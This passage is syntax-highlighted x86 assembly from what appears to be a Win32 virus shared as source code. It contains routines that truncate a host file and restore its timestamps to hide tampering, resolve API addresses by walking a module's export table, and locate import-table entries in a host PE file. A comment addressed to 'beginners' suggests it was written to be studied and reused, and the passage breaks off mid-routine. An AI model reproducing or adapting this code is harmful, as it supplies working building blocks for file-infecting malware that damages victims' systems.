    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MySetFilePointer</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MySetEndOfFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;truncate file</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data.WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data.WFD_ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data.WFD_ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MySetFileTime</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;restore time</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyCloseHandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;and finally close file</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc1">;procedure for exploring modules export table</span><span class="sc0">
</span><span class="sc5">MyGetProcAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc1">;input:</span><span class="sc0">
                </span><span class="sc1">;ebx - module address</span><span class="sc0">
                </span><span class="sc1">;esi - pointer to API name</span><span class="sc0">
            </span><span class="sc1">;output:</span><span class="sc0">
                </span><span class="sc1">;ecx - address of GetProcAddress at memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
</span><span class="sc5">Search_for_API_name</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    
</span><span class="sc5">Next_Char_in_API_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Matched_char_in_API_name</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Search_for_API_name</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">Proc_Address_not_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">End_MyGetProcAddress</span><span class="sc0">

</span><span class="sc5">Matched_char_in_API_name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_Char_in_API_name</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Check_Index</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">

</span><span class="sc5">End_MyGetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MyGetProcAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;all beginners=&gt; im so sorry, but I didnt have any time to comment this stuff.</span><span class="sc0">
</span><span class="sc5">GetProcAddressIT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc1">;input:</span><span class="sc0">
                </span><span class="sc1">;EAX - API name</span><span class="sc0">
                </span><span class="sc1">;ECX - lptr to PE header</span><span class="sc0">
                </span><span class="sc1">;EDX - module name</span><span class="sc0">
            </span><span class="sc1">;output:</span><span class="sc0">
                </span><span class="sc1">;EAX - RVA pointer to IAT, 0 if error</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc1">;RVA of Import table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">scan_sections</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">section_found</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">scan_sections</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">

</span><span class="sc5">section_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">Get_DLL_Name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.esi.ID_Name</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Name RVA</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Next_Char_from_DLL</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'.'</span><span class="sc0">    
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">IT_nup</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">no_up</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">no_up</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc0">
</span><span class="sc5">IT_nup</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Get_DLL_Name</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_Char_from_DLL</span><span class="sc0">

</span><span class="sc5">Found_DLL_Name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">eax.ID_OriginalFirstThunk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">Next_Imported_Name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT3</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc5">next_char</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_step</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">got_it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_char</span><span class="sc0">
</span><span class="sc5">next_step</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next_Imported_Name</span><span class="sc0">

</span><span class="sc5">got_it</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">

</span><span class="sc5">End_GetProcAddressIT3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">End_GetProcAddressIT2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">End_GetProcAddressIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetProcAddressIT</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">Checksum64</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">         </span><span class="sc1">;output:</span><span class="sc0">
                </span><span class="sc1">;   EDX:EAX -   64-bit checksum</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;save regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;nulify eax</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">                     </span><span class="sc1">;nulify edx</span><span class="sc0">
</span><span class="sc5">make_crc</span><span class="sc4">:</span><span class="sc0">
